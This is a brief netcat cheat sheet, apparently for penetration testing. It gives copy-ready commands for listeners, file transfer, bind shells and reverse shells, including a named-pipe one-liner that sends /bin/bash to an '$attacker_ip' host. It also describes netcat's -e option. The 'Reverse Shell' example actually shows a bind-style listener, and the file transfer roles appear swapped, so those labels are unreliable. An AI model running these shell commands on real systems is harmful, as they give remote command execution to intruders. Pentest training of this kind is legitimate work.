# Netcat Cheatsheet

## Useful commands and context

Interact with application:
```bash
nc -nv $IP $PORT
```
Listener:
```bash
nc -nlvp $PORT
```
File transfer (client):
```bash
nc -nlvp $PORT > $FILE
```
File transfer (server):
```bash
nc -nv $IP $PORT < $FILE_TO_SEND
```

Bind shells
```bash
nc -nlvp $PORT -e cmd.exe # Listener
nc -nv $IP $PORT
```

Reverse Shell
```bash
nc -nv $IP $PORT
nc -nlvp $PORT -e /bin/bash  # Listener
```

NC disabled -e oldschool [Ed Skoudis](https://twitter.com/edskoudis)
```bash
mknod backpipe p; nc $attacker_ip $port 0<backpipe | /bin/bash 1>backpipe
```


## -e
Kali linux has nc compiled with the flag: `-DGAPING_SECURITY_HOLE` with enabled -e option **MOST** modern Linux/BSD system **DON'T SUPPORT** -e. This option can redirect the input, output, and error messages of an executable to a TCP/UDP port rather than the default console.

## Flags
-n	skip DNS name resolution
-v	verbosity
-l	listener
-p	port